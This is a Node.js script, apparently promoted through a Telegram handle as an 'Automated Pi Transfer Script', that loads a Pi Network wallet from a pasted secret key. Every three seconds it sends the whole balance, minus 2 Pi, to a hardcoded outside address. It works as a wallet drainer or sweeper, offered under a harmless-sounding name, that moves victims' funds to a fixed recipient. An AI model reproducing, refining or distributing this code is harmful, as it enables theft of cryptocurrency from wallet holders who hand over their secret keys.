const StellarSdk = require('stellar-sdk');
const axios = require('axios');

const server = new StellarSdk.Server('https://api.mainnet.minepi.com');
const senderSecret = ''; // YOUR SENDER SECRET
const senderKeypair = StellarSdk.Keypair.fromSecret(senderSecret);
const senderPublic = senderKeypair.publicKey();
const apiUrl = `https://api.mainnet.minepi.com/accounts/${senderPublic}`;
const recipient = 'GB2RKMV7GHGFSSIDQSVUZXZ4IEFDD2EPWA6V4FBH3ERGVZEZSWPEOJPP';

async function sendPi() {
    try {
        console.log('🔐 Sender Public Key:', senderPublic);
        const account = await server.loadAccount(senderPublic);
        const fee = (await server.fetchBaseFee()).toString();

        const res = await axios.get(apiUrl);
        const amount1 = res.data.balances[0].balance;
        console.log(`Pi Balance : ${amount1}`);

        const withdrawAmount = Number(amount1) - 2;

        if (withdrawAmount <= 0) {
            console.log("⚠️ Not enough Pi to send (needs to leave 2 Pi behind). Skipping...");
            return;
        }

        const formattedAmount = Number(withdrawAmount.toFixed(7)).toString();
        console.log(`➡️ Sending: ${formattedAmount} Pi`);

        const tx = new StellarSdk.TransactionBuilder(account, {
            fee,
            networkPassphrase: 'Pi Network',
        })
            .addOperation(StellarSdk.Operation.payment({
                destination: recipient,
                asset: StellarSdk.Asset.native(),
                amount: formattedAmount,
            }))
            .setTimeout(30)
            .build();

        tx.sign(senderKeypair);
        const result = await server.submitTransaction(tx);

        if (result && result.hash) {
            console.log("✅ Tx Hash:", result.hash);
            console.log(`🔗 View Tx:" https://api.mainnet.minepi.com/transactions/${result.hash}`);
        } else {
            console.log("⚠️ Transaction submitted but no hash returned.");
            console.log("📝 Result:", result);
        }
    } catch (e) {
        console.error('❌ Error:', e.response?.data?.extras?.result_codes || e);
    }
}

// Send every 3 seconds
setInterval(() => {
    sendPi();
}, 3000);

// Automated Pi Transfer Script
// Telegram: @autoboyt
